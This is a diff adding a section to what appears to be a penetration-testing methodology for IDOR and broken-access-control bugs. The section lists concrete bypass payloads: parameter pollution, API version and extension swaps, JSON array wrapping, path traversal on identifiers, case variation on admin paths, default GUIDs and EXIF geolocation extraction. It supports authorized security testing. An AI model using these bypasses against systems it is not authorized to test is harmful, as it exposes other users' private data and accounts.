@@ -489,3 +489,78 @@ Mark as FALSE POSITIVE and do NOT report if:
 - The data accessed is completely non-sensitive (e.g., public blog post count, public avatar URL) → downgrade to Informational only
 - The endpoint is documented as public or is accessible without any authentication → NOT an IDOR (intentional design)
 - UUID randomness makes enumeration practically infeasible AND there is no way to obtain other users' UUIDs → mark as Low and document the ID guessability separately
+
+
+## Additional Techniques — ported from WebSkills (bac-test)
+
+These are concrete authorization-bypass variants and cross-account entry checks that complement the dual-session methodology above. Run them whenever a direct ID swap returns 401/403 or when profiling an unfamiliar ID scheme.
+
+### General cross-account entry points (beyond the standard login session)
+- Use account A's Cookie/Authorization token to reach account B's objects (baseline BOLA).
+- Use a **newsletter unsubscribe session** to reach a victim's PII (these sessions are often weakly scoped).
+- Use a **non-confirmed / unverified-email session** to reach a resource that is supposed to require a confirmed user.
+
+### IDOR bypass-variant checklist (try each when a plain swap is blocked)
+```
+# Parameter pollution
+?users=01                    → ?users=01&users=02
+?id=1                        → ?id=1&id=2
+{"userid":1234,"userid":2542}   (JSON duplicate keys)
+
+# Wildcard / mass disclosure
+GET /api/users/{id}          → GET /api/users/*
+
+# Old / alternate API version
+GET /api/v3/users/01         → GET /api/v1/users/02
+
+# Extension swap (auth often keyed on the base route)
+GET /user_data/2341          → 401
+GET /user_data/2341.json     → 200
+GET /user_data/2341.xml / .config / .txt
+
+# Method swap
+POST /users/delete/{id}      → 403
+GET|PUT|PATCH|DELETE variant → 200
+
+# Referer / header-validated IDs
+GET /users/02  Referer: /users/01   → 403
+GET /users/82  Referer: /users/02   → 200
+
+# JSON array / object wrapping (breaks scalar authz checks)
+{"userid":123}               → 401
+{"userid":[123]}             → 200
+{"userid":{"userid":123}}    → 200
+
+# Add the object param where it is absent by default
+GET /api_v1/messages                       → 200 (own)
+GET /api_v1/messages?user_id=victim_uuid   → 200 (victim)
+
+# Parameter-name swap
+GET /api/albums?album_id=<id>   → try ?account_id=<id>  (Burp "Paramalyzer" remembers host params)
+
+# Content-Type swap
+Content-Type: application/xml → application/json
+
+# Path traversal on the identifier
+POST /users/delete/victim_id           → 403
+POST /users/delete/my_id/..victim_id   → 200
+
+# Case-variation function-level bypass
+GET /admin/profile → 401 ;  /Admin/ , /ADMIN/ , /aDmin/ , /admIn/ → 200
+
+# Decode the ID before assuming it is opaque
+/GetUser/dmljdGltQG1haWwuY29t   (base64 "victim@mail.com")
+Encrypted IDs → try hashes.com / known-hash decode
+Non-numeric ↔ numeric: /file?id=90djbk... → /file?id=302
+```
+
+### GUID / UUID entry checks
+- Swap a GUID for a numeric ID or an email: `/users/1b84c196-...` → `/users/82` or `/users/agb.com`.
+- Try fixed/default GUIDs: `00000000-0000-0000-0000-000000000000`, `11111111-1111-1111-1111-111111111111` (often admin/test accounts).
+- If enumeration fails, leak the victim's GUID from Signup / Reset-Password / other endpoints (these frequently disclose it), Google dorks, GitHub, Wayback, or Burp history.
+
+### EXIF-geolocation IDOR (image uploads)
+If uploaded images keep EXIF, any viewer can extract geolocation, device name, and software version. Upload a sample from github.com/ianare/exif-samples, then read the stored image's EXIF (e.g. exif.regex.info). Real report: hackerone.com/reports/906907.
+
+### Don't trust the status code
+On 401/403, re-check whether the action still took effect (blind IDOR / side effects) — export files, email/notification alerts, and background jobs often complete despite an error response.
